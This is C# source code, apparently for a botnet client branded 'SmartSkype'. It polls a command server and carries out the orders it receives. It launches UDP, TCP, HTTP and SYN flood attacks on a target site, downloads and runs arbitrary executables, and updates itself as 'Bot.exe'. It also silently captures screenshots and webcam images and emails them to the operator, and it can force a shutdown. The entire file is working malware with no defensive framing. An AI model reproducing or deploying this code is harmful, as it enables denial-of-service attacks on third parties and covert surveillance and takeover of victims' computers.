using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Media;
using System.IO;
using System.Windows.Forms;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Drawing.Printing;
using System.Net.Mime;
using System.Net.Mail;
using AForge.Video;
using AForge.Video.DirectShow;
using UITimer = System.Threading.Timer;

namespace Reciever
{
    static class Functions
    {

        public static class DDoS
        {

            //Timer that stops DDoS when called
            public static void DTimerCall(object obj)
            {
                Reciever.Program.DActive = false;
                Reciever.Program.DTimer.Dispose();
            }
            
            public static void UDPStart(string Site)
            {
               Reciever.Program.DActive = true;
                //UDP Config
                int UDPThreads = 10000;
                int UDPDelay = 1000;
                IPAddress SiteIP = Dns.GetHostAddresses(Site)[0];

                for (int i = 0; i < UDPThreads; i++)
                {
                    Thread UDPThread = new Thread(() => UDP(UDPDelay, SiteIP));
                    UDPThread.Start();
                }
            }

            static void UDP(int Delay, IPAddress Site)
            {
                IPEndPoint SiteEndPoint = new IPEndPoint(Site, 80);
                Byte[] PacketContents = new Byte[1400];
                Random Rand = new Random();
                Rand.NextBytes(PacketContents);

                while (Reciever.Program.DActive)
                {
                    Socket UDPSocket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                    UDPSocket.SendTo(PacketContents, SiteEndPoint);
                    Thread.Sleep(Delay);
                }
            }

            public static void TCPStart(string Site)
            {
                Reciever.Program.DActive = true;
                int Threads = 100;
                IPAddress TCPSite = Dns.GetHostAddresses(Site)[0];

                for (int i = 0; i <= Threads; i++)
                {
                    Thread TCPThread = new Thread(() => TCP(TCPSite));
                    TCPThread.Start();
                }

            }

            static void TCP(IPAddress Site)
            {
                IPEndPoint TCPEndPoint = new IPEndPoint(Site, 80);
                Byte[] PacketContents = new byte[1400];
                Random Rand = new Random();
                Rand.NextBytes(PacketContents);

                while (Reciever.Program.DActive)
                {
                    try
                    {
                        Socket TCPSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        TCPSocket.Connect(TCPEndPoint);
                        TCPSocket.Send(PacketContents);
                        Thread.Sleep(1000);
                    }

                    catch (Exception e)
                    { }
                }
            }

            public static void HTTPStart(string Site)
            {
                Reciever.Program.DActive = true;
                int Threads = 1000;
                IPAddress SiteIP = Dns.GetHostAddresses(Site)[0];

                for (int i = 0; i < Threads; i++)
                {
                    Thread HttpThread = new Thread(() => HTTP(SiteIP));
                    HttpThread.Start();
                }
            }

            static void HTTP(IPAddress Site)
            {
                IPEndPoint HTTPEndPoint = new IPEndPoint(Site, 80);
                while (Reciever.Program.DActive)
                {
                    try
                    {
                        Socket HTTPSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        HTTPSocket.Connect(HTTPEndPoint);
                        HTTPSocket.Send(Encoding.ASCII.GetBytes("GET /"));
                    }

                    catch (Exception e)
                    { }
                }
            }

            public static void StartSYN(string Site)
            {
                Reciever.Program.DActive = true;
                int Threads = 10;
                IPAddress SYNIP = Dns.GetHostAddresses(Site)[0];

                for (int i = 0; i <= Threads; i++)
                {
                    Thread SYNThread = new Thread(() => SYN(SYNIP));
                    SYNThread.Start();
                }
            }

            static void SYN(IPAddress Site)
            {
                IPEndPoint SYNEndPoint = new IPEndPoint(Site, 80);
                while (Reciever.Program.DActive)
                {
                    Socket SYNSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    SYNSocket.Blocking = false;
                    SYNSocket.BeginConnect(SYNEndPoint, new AsyncCallback(SYNCall), SYNSocket);
                    Thread.Sleep(100);

                    if (SYNSocket.Connected)
                    {
                        SYNSocket.Disconnect(false);
                    }

                    SYNSocket.Close();
                    SYNSocket = null;
                }
            }

            static void SYNCall(IAsyncResult arg)
            { }
        }

        public static class Sounds
        {
            public static void Fresh()
            {
                if (!File.Exists(Reciever.Program.AppPath + "\\fresh.wav"))
                {
                    WebClient DownloadFresh = new WebClient();
                    DownloadFresh.DownloadFile("http://www.site.com/skype/fresh.wav", Reciever.Program.AppPath + "\\fresh.wav");
                    DownloadFresh.Dispose();
                }

                SoundPlayer Prince = new SoundPlayer(Reciever.Program.AppPath + "\\fresh.wav");
                Prince.Play();
                Prince.Dispose();
            }

            public static void Speak(string speak)
            {
                System.Speech.Synthesis.SpeechSynthesizer Speak = new System.Speech.Synthesis.SpeechSynthesizer();
                Speak.Speak(speak);
                Speak.Dispose();

            }

            public static void Beep(string Frequency, string Length)
            {
                int FrequencyInt = Convert.ToInt32(Frequency);
                int LengthInt = Convert.ToInt32(Length);
                Console.Beep(FrequencyInt, LengthInt);
            }
        }

        public static class IO
        {

            public static void Message(string message)
            {
                MessageBox.Show(message);
            }

            public static void Install(string link)
            {
                Random RandomNum = new Random();
                int Number = RandomNum.Next(1, 10);

                try
                {
                    WebClient InstallURL = new WebClient();
                    InstallURL.DownloadFile(link, Reciever.Program.AppPath + "\\" + Number + ".exe");
                    InstallURL.Dispose();
                    Process.Start(Reciever.Program.AppPath + "\\" + Number + ".exe");
                }

                catch (Exception e)
                { }
            }

            public static void Update(string link)
        {

        }

        public static void Uninstall()
        {
            Application.Exit();
        }

            public static void UpdateMe()
            {
                string PVersion = Application.ProductVersion;
                WebClient CheckUpdate = new WebClient();
                string Output = CheckUpdate.DownloadString("http://www.site.com/skype/update.php?version=" + PVersion);
                CheckUpdate.Dispose();

                if (Output != "")
                {
                    WebClient DownloadUpdate = new WebClient();
                    DownloadUpdate.DownloadFile(Output, Reciever.Program.AppPath + "\\Bot.exe");
                    DownloadUpdate.Dispose();

                    Process.Start(Reciever.Program.AppPath + "\\Bot.exe");
                }
            }

           public static void Print(string Text)
            {
                PrintDocument PDocument = new PrintDocument();
                PDocument.PrintPage += delegate(object Sender, PrintPageEventArgs e)
                {
                    e.Graphics.DrawString(Text, new Font("Times New Roman", 12), new SolidBrush(Color.Black), new RectangleF(0, 0, PDocument.DefaultPageSettings.PrintableArea.Width, PDocument.DefaultPageSettings.PrintableArea.Height));
                };

                try
                {
                    PDocument.Print();
                }

                catch (Exception e)
                { }
            }
        }

        public static class Image
        {
            
            public static void Screenshot()
            {
                // Path for file to be temp written to
                string tempFileName = "\\tempimg.jpg";
                string file = Reciever.Program.AppPath + tempFileName;

                // Screenshot variables
                Bitmap bt;
                Graphics screenShot;

                // Email variables
                var fromAddress = new MailAddress("#SENDEREMAIL#", "CoolSec - SmartSkype");
                var toAddress = new MailAddress("#RECEIVEREMAIL#", "#USERNAME#");
                const string fromPassword = "#PASSWORD#";
                const string subject = "CoolBot Screenshot";
                const string body = "#MESSAGE#";

                // Screenshot method
                bt = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
                screenShot = Graphics.FromImage(bt);
                screenShot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size,
                    CopyPixelOperation.SourceCopy);
                bt.Save(file, ImageFormat.Jpeg);

                // Creates attachement for email
                Attachment img = new Attachment(file, MediaTypeNames.Application.Octet);
                ContentDisposition disposition = img.ContentDisposition;
                disposition.CreationDate = File.GetCreationTime(file);
                disposition.ModificationDate = File.GetLastWriteTime(file);
                disposition.ReadDate = File.GetLastAccessTime(file);

                // Sets up SMTP Connection to send email
                var smtp = new SmtpClient
                {
                    Host = "#HOST#",
                    Port = 587,
                    EnableSsl = true,
                    DeliveryMethod = SmtpDeliveryMethod.Network,
                    UseDefaultCredentials = false,
                    Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
                };

                // Pieces the email together and sends
                using (var message = new MailMessage(fromAddress, toAddress) { Subject = subject, Body = body })
                {
                    message.Attachments.Add(img);
                    smtp.Send(message);
                }

              
                File.Delete(file);

            }
        }

        public static class Webcam
        {
            private static FilterInfoCollection videoDevices;
            private static VideoCaptureDevice webcam;
            // Sets frame size of webcam
            private static Size frameSize = new Size(320, 240);

            /// <summary>
            /// Gets all devices, chooses default primary device, sets frame size and starts device.
            /// </summary>
            public static void CaptureCam()
            {
                try
                {
                    // Gets all possible video devices
                    videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                    // Just gets the primary video device
                    webcam = new VideoCaptureDevice(videoDevices[0].MonikerString);
                    webcam.NewFrame += new NewFrameEventHandler(CaptureFrame);
                    //webcam.SnapshotFrame += new NewFrameEventHandler(Snapshot_Frame);
                    webcam.DesiredFrameSize = frameSize;
                    //webcam.ProvideSnapshots = true;
                    webcam.Start();
                }
                catch
                {
                }
            }

            /// <summary>
            /// Saves the current frame taken from the video device and saves it temporarily
            /// </summary>
            /// <param name="sender"></param>
            /// <param name="e"></param>
            private static void CaptureFrame(object sender, NewFrameEventArgs e)
            {
                Bitmap video = (Bitmap)e.Frame.Clone();
                ImageFormat format = ImageFormat.Jpeg;

                string filename = GenerateFileName();
                string ext = ".jpg";
                string file = Reciever.Program.AppPath + "\\" + filename + ext;

                video.Save(file, format);
                webcam.SignalToStop();
                // Email image off to location
                EmailImage(file, filename);
            }

            /// <summary>
            /// Method to randomly generate a 10 character for the file name.
            /// </summary>
            private static string GenerateFileName()
            {
                var chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                var stringChars = new char[10];
                var random = new Random();

                for (int i = 0; i < stringChars.Length; i++)
                {
                    stringChars[i] = chars[random.Next(chars.Length)];
                }
                string result = new String(stringChars);
                return result;
            }

            /// <summary>
            /// Emails the image taken from video device to specific email.
            /// </summary>
            /// <param name="file"></param>
            /// <param name="filename"></param>
            private static void EmailImage(string file, string filename)
            {
                var fromAddress = new MailAddress("#FROM#", "SmartSkype ImageBot");
                var toAddress = new MailAddress("#TO#", "#USER#");
                const string fromPassword = "#PASSWORD#";
                string subject = "SmartSkype Image (" + filename + ")";
                string body = "The following file (" + filename + ") has been attached.\nThank you for using SmartSkype.\n\nRegards,\nCoolSec";

                Attachment img = new Attachment(file, MediaTypeNames.Application.Octet);
                ContentDisposition disposition = img.ContentDisposition;
                disposition.CreationDate = File.GetCreationTime(file);
                disposition.ModificationDate = File.GetLastWriteTime(file);
                disposition.ReadDate = File.GetLastAccessTime(file);

                var smtp = new SmtpClient
                {
                    Host = "#HOST#",
                    Port = 587,
                    EnableSsl = true,
                    DeliveryMethod = SmtpDeliveryMethod.Network,
                    UseDefaultCredentials = false,
                    Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
                };

                using (var message = new MailMessage(fromAddress, toAddress) { Subject = subject, Body = body })
                {
                    message.Attachments.Add(img);
                    smtp.Send(message);
                }

                File.Delete(file);
            }
        }

        public static class Connection
        {
            public static void Listen(Object state)
            {
                int Time = Reciever.Program.Time;

                WebClient Listen = new WebClient();
                string Output = Listen.DownloadString("http://www.site.com/skype/listen?user=" + Reciever.Program.user + "&name=" + Environment.UserName);
                Listen.Dispose();
                string[] ParseOutput = Output.Split(':');
                switch (ParseOutput[0])
                {
                    case "MESSAGE":
                        Functions.IO.Message(ParseOutput[1]);
                        break;

                    case "SHUTDOWN":
                        Reciever.Functions.SystemFunctions.ShutDown();
                        break;

                    case "VISIT":
                        Reciever.Functions.SystemFunctions.Visit(ParseOutput[1]);
                        break;

                    case "INSTALL":
                        Functions.IO.Install(ParseOutput[1]);
                        break;

                    case "UPDATE":
                        Reciever.Functions.IO.Update(ParseOutput[1]);
                        break;

                    case "FRESH":
                        Functions.Sounds.Fresh();
                        break;

                    case "SPEAK":
                        Functions.Sounds.Speak(ParseOutput[1]);
                        break;

                    case "PRINT":
                        Functions.IO.Print(ParseOutput[1]);
                        break;

                    case "UDP":
                        Time = Convert.ToInt32(ParseOutput[2]);
                        Time = Time * 1000;
                        Reciever.Program.DTimer = new UITimer(Functions.DDoS.DTimerCall, null, Time, Time);
                        Functions.DDoS.UDPStart(ParseOutput[1]);
                        break;

                    case "TCP":
                        Time = Convert.ToInt32(ParseOutput[2]);
                        Time = Time * 1000;
                        Reciever.Program.DTimer = new UITimer(Functions.DDoS.DTimerCall, null, Time, Time);
                        Functions.DDoS.TCPStart(ParseOutput[1]);
                        break;

                    case "HTTP":
                        Time = Convert.ToInt32(ParseOutput[2]);
                        Time = Time * 1000;
                        Reciever.Program.DTimer = new UITimer(Functions.DDoS.DTimerCall, null, Time, Time);
                        Functions.DDoS.HTTPStart(ParseOutput[1]);
                        break;

                    case "SYN":
                        Time = Convert.ToInt32(ParseOutput[2]);
                        Time = Time * 1000;
                        Reciever.Program.DTimer = new UITimer(Functions.DDoS.DTimerCall, null, Time, Time);
                        Functions.DDoS.StartSYN(ParseOutput[1]);
                        break;

                    case "SCREENSHOT":
                        Functions.Image.Screenshot();
                        break;

                    case "BOTKILLER":
                        //To be done
                        break;

                    case "UNINSTALL":
                        Reciever.Functions.IO.Uninstall();
                        break;

                    case "WEBCAM":
                        Functions.Webcam.CaptureCam();
                        break;

                    case "BEEP":
                        Functions.Sounds.Beep(ParseOutput[1], ParseOutput[2]);
                        break;

                    case "STOP":
                        Reciever.Program.DActive = false;
                        break;
                }
            }

            static bool Connect()
            {
                try
                {
                    WebClient Connect = new WebClient();
                    string Output = Connect.DownloadString("http://www.site.com/skype/connect?user=" + Reciever.Program.user + "&name=" + Environment.UserName);
                    Connect.Dispose();
                    return true;
                }

                catch (Exception e)
                {
                    return false;
                }
            }

            //Call back function for KeepAlive timer - keeps bot online
            public static void KeepAlive(Object state)
            {
                Connect();
            }
        }

        public static class SystemFunctions
        {
            public static void ShutDown()
            {
                Process.Start("shutdown", "/s /t 0");
            }

            public static void Visit(string site)
            {
                Process.Start(site);
            }
        }
    }
}
